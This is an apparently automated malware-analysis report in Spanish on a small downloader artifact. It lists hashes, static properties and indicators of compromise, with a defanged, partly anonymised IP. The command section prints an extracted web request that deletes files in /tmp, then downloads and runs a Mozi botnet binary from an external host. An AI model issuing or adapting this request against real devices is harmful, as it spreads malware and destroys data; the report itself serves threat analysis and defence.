# 🧬 Payload Analysis

`541924a48d288115f8664af967ecb319c9c0ad953eb2dc2c78c6265df975a1e5`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 273 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://182.233.211.XXX:44410/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:27:32.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `541924a48d288115f8664af967ecb319c9c0ad953eb2dc2c78c6265df975a1e5`
- **MD5:** `99c2287d754426dedfca2b365f6dd3b5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 273 B |
| Entropía | 5.39 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Download indicators (wget/curl + /tmp)

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://182.233.211.XXX:44410/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://182.233.211.XXX:44410/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws | strings |
| ip | 182.233.211.XXX | static_analysis |
| ip | 190.179.164.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://182.233.211.XXX:44410/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1 | strings |
| hash | 541924a48d288115f8664af967ecb319c9c0ad953eb2dc2c78c6265df975a1e5 | static_analysis |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
